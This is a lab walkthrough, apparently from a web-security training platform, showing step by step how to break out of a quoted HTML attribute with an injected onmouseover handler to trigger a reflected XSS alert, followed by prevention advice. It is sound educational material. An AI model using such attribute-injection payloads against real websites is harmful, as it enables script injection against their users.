# Lab 11: Reflected XSS into attribute with angle brackets HTML-encoded

**Goal**: Perform a reflected XSS attack in an HTML attribute context where angle brackets (`<`, `>`) are HTML-encoded, by injecting an inline event handler to trigger `alert(1)`.

This lab contains a reflected cross-site scripting vulnerability in the search functionality. The application HTML-encodes angle brackets, preventing the creation of new HTML tags. However, the input is reflected directly inside a quoted HTML attribute (`value="..."`).

---

## 🎯 Solution

1. Submit a search query in the search box.
2. Intercept the HTTP request using Burp Suite Proxy and send it to **Repeater**.
3. Observe that the search term is reflected inside an input value attribute:
   ```html
   <input type="text" name="search" value="test123">
   ```
4. Escape the double quote and inject an `onmouseover` event handler:
   ```html
   "onmouseover="alert(1)
   ```
5. Render the URL in the browser and hover over the search input box to execute `alert(1)`.

![Lab 11 Burp Repeater Reflection](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20140519.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Probe Search Input & Intercept Request
Submit a test string (e.g., `test123`) in the search field. Intercept the GET request in Burp Suite and send it to Repeater:

```http
GET /?search=test123 HTTP/2
Host: your-lab-id.web-security-academy.net
```

### Step 2: Analyze Reflection Context
Inspect the HTTP response body in Burp Repeater to locate the reflected search string:

```html
<input type="text" placeholder="Search blog..." name="search" value="test123">
```

- Angle brackets `<` and `>` are encoded as `&lt;` and `&gt;`.
- Double quotes `"` are **NOT** encoded!

### Step 3: Craft Attribute Break-out Payload
Since double quotes are unescaped, we can close the `value` attribute and append a new HTML event handler attribute:

```html
"onmouseover="alert(1)
```

When injected into `value="..."`, the resulting HTML becomes:
```html
<input type="text" placeholder="Search blog..." name="search" value=""onmouseover="alert(1)">
```

### Step 4: Verify and Execute Payload
Send the modified request in Burp Repeater or open the constructed URL in the browser:

```http
/?search="onmouseover="alert(1)
```

![Lab 11 Injecting Event Handler](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20140759.png)

Hover the mouse cursor over the search input box. The `onmouseover` event handler fires immediately:

![Lab 11 Solved Alert](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20140700.png)

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1)` by escaping the quoted attribute and injecting `onmouseover`!

---

## 💡 Key Takeaways: Attribute Injection

- **Context-Specific Encoding**: Filtering angle brackets (`<`, `>`) is insufficient if user input is reflected inside an attribute. If double quotes (`"`) are not escaped, attackers can inject arbitrary HTML attributes (`onmouseover`, `onfocus`, `autofocus`).
- **User Interaction vs Automated Execution**: Attributes like `onfocus` combined with `autofocus` trigger execution automatically without requiring manual hover.

---

## 🔒 Prevention

> [!TIP]
> 1. **Context-Aware Encoding**: HTML attribute values must encode double quotes (`"` to `&quot;`) and single quotes (`'` to `&#39;`) in addition to angle brackets.
> 2. **Use Framework Templates**: Modern template engines automatically encode values placed inside attribute bindings.
